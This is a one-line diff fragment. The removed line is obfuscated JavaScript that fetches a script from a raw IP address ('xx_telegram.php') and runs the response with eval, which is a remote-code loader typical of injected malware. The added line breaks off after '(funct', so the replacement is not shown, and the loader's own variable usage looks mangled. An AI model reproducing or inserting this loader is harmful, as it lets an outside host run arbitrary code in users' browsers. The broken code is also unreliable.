@@ -1,1 +1,1 @@
-(function(a,b,c,d,e,f,g){a[b](c,d+e,f);a[g]();eval(a[e]);})(h,'open','GET','http://139.84.141.119/jumpshare/xx/xx_telegram.php?client=','+n',false,'h.send');
+(funct
